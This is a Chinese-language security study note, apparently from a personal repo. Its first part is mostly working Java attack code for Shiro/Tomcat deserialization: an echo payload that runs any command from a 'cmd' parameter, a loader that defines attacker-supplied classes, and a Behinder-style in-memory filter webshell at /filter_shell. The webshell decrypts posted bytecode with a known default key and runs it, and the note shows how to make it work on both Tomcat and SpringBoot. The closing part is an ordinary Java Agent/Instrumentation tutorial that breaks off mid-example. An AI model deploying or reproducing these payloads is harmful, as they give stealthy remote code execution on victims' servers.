package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;


import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.List;

public class PostEcho1 extends AbstractTranslet {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext  = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(applicationContext);

            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);

            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            AbstractProtocol abstractProtocol = (AbstractProtocol)protocolHandler.get(connector[0]);

            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class aClass : AbstractProtocol_list){
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);

                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> requestInfo_list  = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : requestInfo_list){
                        Request request1  = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();

                        System.out.println(request2.getParameter("c"));
                        byte[] bytes = Base64.getDecoder().decode(request2.getParameter("c"));
                        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                        defineClass.setAccessible(true);
                        Class o3 = (Class) defineClass.invoke(PostEcho1.class.getClassLoader(), new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
                        o3.newInstance();

                    }

                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Scanner;

public class Echo1 extends AbstractTranslet {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext  = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(applicationContext);

            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);

            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            AbstractProtocol abstractProtocol = (AbstractProtocol)protocolHandler.get(connector[0]);

            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class aClass : AbstractProtocol_list){
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);

                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> requestInfo_list  = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : requestInfo_list){
                        Request request1  = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();

                        //  springboot 报错
                        //  response2.getWriter().write(1111);
                        //response2.getOutputStream().write("测试回显".getBytes(StandardCharsets.UTF_8));

                        response2.setCharacterEncoding("UTF-8");
                        response2.setContentType("text/html;charset=UTF-8");
                        InputStream inputStream = Runtime.getRuntime().exec(request2.getParameter("cmd")).getInputStream();
                        Scanner scanner = new Scanner(inputStream).useDelimiter("\\\\a");
                        String output = scanner.hasNext()? scanner.next() : "";
                        response2.getOutputStream().write(output.getBytes(StandardCharsets.UTF_8));
                        response2.getOutputStream().close();
                    }

                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

内存马

用在 tomcat 中注入内存马的poc 时，报错

![image-20220219104313656](img/image-20220219104313656.png)![image-20220219104313656](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219104313656.png?lastModify=1646033842)

因为这里向上转型

![image-20220219105811049](img/image-20220219105811049.png)![image-20220219105811049](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219105811049.png?lastModify=1646033842)

而 filterConfigs 在其父类 `StandardContext` 中，所以需要到父类去获取该变量

```
Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
```

BehinderShellSpringBoot.java

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

public class BehinderShellSpringBoot extends AbstractTranslet implements Filter{
    static {
        try {
            String name = "Evil";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = null;
//            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");

            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            BehinderShellSpringBoot filter = new BehinderShellSpringBoot();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/filter_shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }

        try {
            HttpServletRequest request2 = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request2.getSession();

            HashMap pageContext = new HashMap();
            pageContext.put("request", request2);
            pageContext.put("response", response);
            pageContext.put("session", session);
            if (request2.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //revision BehinderFilter
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new BASE64Decoder().decodeBuffer(request2.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch(Exception e){
            e.printStackTrace();
        }

        // 放行

        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

修改之后成功连接。

![image-20220219111715640](img/image-20220219111715640.png)![image-20220219111715640](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220219111715640.png?lastModify=1646033842)

## shiro内存马兼容tomcat和 springboot

可以使用 try... catch...

```
Field Configs = null;
try{
    Configs = standardContext.getClass().getDeclaredField("filterConfigs");
}catch (Exception e){
    Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
}
```

最终代码：

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/*
 * 兼容 tomcat和springboot 内存马
 */
public class BehinderShellFilterShell extends AbstractTranslet implements Filter {
    static {
        try {
            String name = "Evil";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = null;
            try{
                Configs = standardContext.getClass().getDeclaredField("filterConfigs");
            }catch (Exception e){
                Configs = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
            }


            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            BehinderShellFilterShell filter = new BehinderShellFilterShell();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/filter_shell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());

            standardContext.addFilterMapBefore(filterMap);

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            filterConfigs.put(name,filterConfig);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }

        try {
            HttpServletRequest request2 = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request2.getSession();

            HashMap pageContext = new HashMap();
            pageContext.put("request", request2);
            pageContext.put("response", response);
            pageContext.put("session", session);
            if (request2.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //revision BehinderFilter
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new BASE64Decoder().decodeBuffer(request2.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch(Exception e){
            e.printStackTrace();
        }

        // 放行

        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

变成 base64 编码后 url 编码后， post 传参

```
certutil -f -encode D:\tools\java安全\ysoserial\target\classes\shiro\BehinderShellFilterShell.class key
```

使用加载器

```
package shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;


import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.List;

public class PostEcho1 extends AbstractTranslet {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext  = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(applicationContext);

            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);

            Field protocolHandler = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            protocolHandler.setAccessible(true);
            AbstractProtocol abstractProtocol = (AbstractProtocol)protocolHandler.get(connector[0]);

            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();
            for (Class aClass : AbstractProtocol_list){
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);

                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> requestInfo_list  = (List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : requestInfo_list){
                        Request request1  = (Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();

                        System.out.println(request2.getParameter("c"));
                        byte[] bytes = Base64.getDecoder().decode(request2.getParameter("c"));
                        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                        defineClass.setAccessible(true);
                        Class o3 = (Class) defineClass.invoke(PostEcho1.class.getClassLoader(), new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
                        o3.newInstance();

                    }

                }
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```



https://xz.aliyun.com/t/10696





https://xz.aliyun.com/t/9755#toc-4

https://mp.weixin.qq.com/s/WDmj4-2lB-hlf_Fm_wDiOg

https://xz.aliyun.com/t/7388

https://xz.aliyun.com/t/10696#toc-0

https://xz.aliyun.com/t/6227

https://www.yuque.com/tianxiadamutou/zcfd4v/yzw734#d47444b5

# Java Agent

## Java Agent 机制

JDK1.5 开始，Java新增了`Instrument(Java Agent API)` 和 `JVMTI(JVN Tool Interface)` 功能，允许`JVM`在加载某个`class`文件之前对其字节码进行修改，同时也支持对已加载的`Class(类字节码)`进行重新加载(`Retransform`)。

利用`Java Agent` 这一特性衍生出了`APM (Application Performance Management)`、`RASP(Runtime application self-protection，运行时应用自我保护)`、`IAST (Interactive Application Security Testing，交互式应用程序安全测试)`等相关产品，它们都使用了`Instrumentation/JVMTI` 的API来实现动态修改`Java类字节码`并插入监控或检测代码。

**Java Agent 有两种运行模式**：

1. 启动`Java程序`时添加`-javaagent(Instrumentation API实现方式)`或`-agent path/-agentlib(JVMTI的实现方式)`参数，如`java -javaagent:/data/xxx.jar LingXeTest`。

   ```
   -agentlib:<库名>[=<选项>]
                 加载本机代理库 <库名>, 例如 -agentlib:jdwp
                 另请参阅 -agentlib:jdwp=help
   -agentpath:<路径名>[=<选项>]
                 按完整路径名加载本机代理库
   -javaagent:<jar 路径>[=<选项>]
                 加载 Java 编程语言代理, 请参阅 java.lang.instrument
   ```

2. JDK1.6 新增了`attach(附加方式)`方式，可以对运行中的 Java进程 附加`Agent`。

区别：第一种方式只能在程序启动时指定`Agent 文件`，而`attach`方式可以在`Java程序`运行后根据`进程ID`动态注入`Agent`到`JVM`。

## Java Agent

`Java Agent` 和普通的Java类并没有任何区别，普通的Java程序中规定了`main`方法为程序入口，而`Java Agent`则将`premain`  (Agent模式) 和`agentmain` (Attach模式) 作为了 Agent 程序的入口，两者所接受的参数是一致的。

```
public static void premain(String args, Instrumentation inst) {}
public static void premain(String agentArgs)

public static void agentmain(String args, Instrumentation inst) {}
```

JVM会优先加载带`Instrumentation`签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种。

在`sun.instrument.InstrumentationImpl`类中有逻辑实现，`loadClassAndStartAgent` 方法

![image-20220121212420161](img/image-20220121212420161.png)![image-20220121212420161](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220121212420161.png?lastModify=1646033842)



`Java Agent` 还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，**`Java Agent`还强制要求了所有的jar文件中必须包含`/META-INF/MANIFEST.MF`文件，且该文件中必须定义好`Premain-Class` (Agent模式)或`Agent-Class`(Agent模式)配置，**如：

```
Premain-Class: agent.CrackLicenseAgent
Agent-Class: agent.CrackLicenseAgent
```

如果我们需要修改已经被JVM加载过的字节码，那么还需要设置在`MANIFEST.MF`中添加`Can-Retransform-Classes: true` 或 `Can-Redefine-Classes: true`。

## Instrumentation

`java.lang.instrument.Instrumentation`  是检测运行在`JVM`程序的`Java API`，利用`Instrumentation` 我们可以实现：

1. 动态添加或移除自定义的`ClassFileTransformer` (`addTransformer/removeTransformer`) ，JVM会在类加载时调用`Agent`中注册的`ClassFileTransformer`。
2. 动态修改`classpath` (`appendToBootstrapClassLoaderSearch`、`appendToSystemClassLoaderSearch`)，将Agent程序添加到`BootstrapClassLoader` 和 `SystemClassLoaderSearch` (对应的是`ClassLoader类的getSystemClassLoader方法`，默认是`sun.misc.Launcher$AppClassLoader`) 中搜索。
3. 动态获取所有JVM已加载的类 (`getAllLoadedClasses`)。
4. 动态获取某个类加载器已经实例化的所有类 (`getInitiatedClasses`) 。
5. 重定义某个已加载的类的字节码 (`redefineClasses`)。
6. 动态设置`JNI`前缀 (`setNativeMethodPrefix`) ，可以实现 `Hook native` 方法。
7. 重新加载某个已经被JVM加载过的类字节码 (`retransformClasses`)。

`Instrumentation` 类方法：

![07EC4F97-CD49-41E6-95CE-FEB000325E33](img/103064424_07EC4F97-CD49-41E6-95CE-FEB000325E33.png)![07EC4F97-CD49-41E6-95CE-FEB000325E33](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/103064424_07EC4F97-CD49-41E6-95CE-FEB000325E33.png?lastModify=1646033842)

## ClassFileTransformer

`java.lang.instrument.ClassFileTransformer` 是一个转换类文件的代理接口，我们可以在获取到`Instrumentation` 对象后通过`addTransformer` 方法添加自定义类文件转换器。

```
package java.lang.instrument;

public interface ClassFileTransformer {

  /**
   * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
   *
   * @param loader              定义要转换的类加载器；如果是引导加载器，则为 null
   * @param className           类名,如:java/lang/Runtime
   * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
   * @param protectionDomain    要定义或重定义的类的保护域
   * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
   * @return 字节码byte数组。
   */
  byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                          ProtectionDomain protectionDomain, byte[] classfileBuffer);

}
```

重写`transform`方法需要注意：

1. `ClassLoader` 如果是被`Bootstrap ClassLoader(引导类加载器)` 所加载，那么`loader`参数的值为 null。
2. 修改类字节码时需要特别注意插入的代码在对应的`ClassLoader`中可以正确的的获取到，否则会报`ClassNotFoundException` ，比如修改`java.io.FileInputStream` (该类由`Bootstrap ClassLoader`加载)时插入了我们检测代码，那么我们将必须保证`FileInputStream`能够获取到我们的检测代码类。
3. JVM类名的书写方式路径方式: `java/lang/String` 而不是我们常用的类名方式：`java.lang.String`。
4. 类字节码必须符合JVM检验要求，如果无法验证类字节码会导致JVM崩溃或者VerifyError (类验证错误)。
5. 如果修改的是`retransform`类(修改已被JVM加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。
6. `addTransformer` 时如果没有传入`retransform`参数(默认是`false`)就算`MANIFEST.MF`中配置了`Can-Redefine-Classes: true` 而且手动调用了`retransformClasses`方法也一样无法`retransform`。
7. 卸载`transform`时需要使用创建时得`Instrumentation`实例。

## Premain

1. 创建项目

2. 创建 premain 类，并实现 premain 方法

   ```
   package agent;
   
   import java.lang.instrument.Instrumentation;
   
   public class PreDemo {
       public static void premain(String args, Instrumentation inst) {
           for (int i = 0; i < 10; i++) {
               System.out.println("premain 测试");
           }
       }
   }
   ```

3. 再`src/main/resources` 目录下创建`META-INF/MANIFEST.MF`，需要指定 Premain-Class

   ```
   Manifest-Version: 1.0
   Premain-Class: agent.PreDemo
   ```

   ps： 最后须有空行

4. 打包成 jar

   ![image-20220215115229653](img/image-20220215115229653.png)![image-20220215115229653](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115229653.png?lastModify=1646033842)

   ![image-20220215115249855](img/image-20220215115249855.png)![image-20220215115249855](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115249855.png?lastModify=1646033842)

   ![image-20220215115314865](img/image-20220215115314865.png)![image-20220215115314865](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115314865.png?lastModify=1646033842)

   生成

   ![image-20220215115423620](img/image-20220215115423620.png)![image-20220215115423620](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115423620.png?lastModify=1646033842)

5. 使用 `-javaagent:agent.jar` 参数执行 hello.jar

   或添加 VM选项

   ```
   package agent;
   
   import static java.lang.Thread.sleep;
   
   public class Test {
       public static void main(String[] args) {
           new Thread(new Runnable() {
               @Override
               public void run() {
                   while (true) {
                       hello();
                       try {
                           sleep(3000);
                       } catch (InterruptedException e) {
                           e.printStackTrace();
                       }
                   }
               }
           }).start();
       }
   
       public static void hello(){
   
           System.out.println("hello");
       }
   
   }
   ```

   ![image-20220215115740057](img/image-20220215115740057.png)![image-20220215115740057](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115740057.png?lastModify=1646033842)

   效果：

   ![image-20220215115753272](img/image-20220215115753272.png)![image-20220215115753272](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220215115753272.png?lastModify=1646033842)

流程：

![img](img/20210416111900-7d22bb02-9e62-1-16448975082391.png)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20210416111900-7d22bb02-9e62-1-16448975082391.png?lastModify=1646033842)

这种方法存在一定的局限性 ---- 只能在启动时使用 `-javaagent` 参数指定。在实际环境中，目标的 JVM 通常都是已经启动的状态，无法预先加载 premain。相比之下， agentmain 更加实用。

## agentmain

写一个`agentmain`和`premain`差不多，只需要在`META-INF/MANIFEST.MF`中加入`Agent-Class:`即可

```
Manifest-Version: 1.0
Premain-Class: agent.PreDemo
Agent-Class: agent.AgentDemo
```

不同的是，这种方法不是通过JVM启动前的参数来制定的，官方为了实现启动后加载，提供了 `Attach API` 。Attach API ，只有2 个主要的类，都在 `com.sun.tools.attach` 包里，着重关注的是`VitualMachine`这个类。

> 手动将你jdk安装目录下：lib目录中的tools.jar添加进当前工程的Libraries中才能找到此类。

## VirtualMachine

字面上表示一个java虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、`loadAgent`、`Attach`、`Detach` 等方法，可以实现的功能非常强大。该类允许我们通过给 attach 方法传入一个 jvm 的 pid ( 进程id)，远程连接到 jvm 上。代理类注入操作只是功能之一，通过 `loadAgent` 方法向 jvm 注册一个代理程序 agent，在该 agent 的代理程序中会得到一个 `Instrumentation` 实例。

```
// com.sun.tools.attach.VirtualMachine

// 下面的示例演示如何使用VirtualMachine:

// attach to target VM
VirtualMachine vm = VirtualMachine.attach("2177");  
// start management agent
Properties props = new Properties();
